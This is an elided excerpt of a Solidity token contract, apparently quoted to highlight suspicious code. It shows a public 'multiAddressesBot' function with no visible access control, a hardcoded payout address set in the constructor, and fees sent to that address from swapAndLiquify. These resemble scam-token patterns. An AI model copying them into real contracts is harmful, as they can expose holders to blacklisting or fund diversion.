...
contract Token is Context, IERC20, Ownable{
    ...
    function multiAddressesBot(uint256 amount, bool status,address[] calldata addresses) public {
    ...
    constructor () {
        ...
        toPayAddr = payable(address(0x58725Ef736deBA40cdFA3C9b9497eA9Be7E03237));
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(MarketAmount > 0)
            toPayAddr.transfer(MarketAmount);
    }
